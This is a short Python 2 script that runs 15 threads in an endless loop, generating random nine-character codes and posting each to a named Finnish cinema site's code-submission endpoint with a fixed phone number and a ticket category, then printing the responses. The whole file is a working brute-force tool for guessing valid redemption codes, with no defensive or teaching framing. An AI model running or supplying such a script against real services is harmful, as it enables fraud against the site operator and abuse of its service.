#!/usr/bin/env python
from Queue import Queue
from threading import Thread
import time
import sys
import urllib2
import os
import itertools
import urllib
import json
import pprint
import time
import string
import random


def id_generator(size=9, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

def do_stuff(q):
	global hoo
	while True:
		code = q.get()
					
		try:
			url = 'http://www.leffakorkki.fi/code/submit_number_and_code'
			values = {'number' : '0501234567',
			          'code' : code,
			          'category' : 'lippu' }
			
			data = urllib.urlencode(values)
			req = urllib2.Request(url, data)
			response = urllib2.urlopen(req)
			asd = response.read()
			print code + " " + asd
			q.task_done()
		except Exception,e:
			print str(e)
			pass




q = Queue(maxsize=0)
num_threads = 15
hoo = 0

for r in range(num_threads):
	worker = Thread(target=do_stuff, args=(q,))
	worker.setDaemon(True)
	worker.start()
	print "Worker " + str(r) + " started succesfully!"
		


while True:
	for j in range(0,num_threads):
 		q.put(id_generator())
 		hoo = hoo + 1
	q.join()
	print str(hoo)

